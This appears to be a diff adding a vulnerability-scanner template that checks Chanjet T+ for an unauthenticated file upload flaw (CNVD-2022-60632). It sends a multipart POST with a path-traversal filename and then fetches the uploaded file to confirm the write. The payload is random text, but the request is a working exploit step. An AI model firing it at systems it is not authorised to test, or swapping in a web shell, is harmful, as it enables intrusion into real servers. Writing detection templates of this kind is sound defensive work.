@@ -1,0 +1,41 @@
+id: chanjet_t_plus-file_upload-cnvd-2022-60632
+
+info:
+  name: Chanjet T+ File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    File upload vulnerability in Chanjet T+ allowing arbitrary file upload that can lead to remote code execution or sensitive information exposure.
+
+variables:
+  randstr: "{{rand_text_alphanumeric(60)}}"
+  rboundary: "{{rand_text_alphanumeric(8)}}"
+  randname: "{{rand_text_alphanumeric(6)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/tplus/SM/SetupAccount/Upload.aspx?preload=1"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}"
+    body: |
+      ------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name="File1"; filename="../../../img/login/{{randname}}.jpg"\r\nContent-Type: image/jpeg\r\n\r\n{{randstr}}\r\n------WebKitFormBoundary{{rboundary}}--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "/tplus/img/login/{{randname}}.jpg"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{randstr}}"
+        part: body
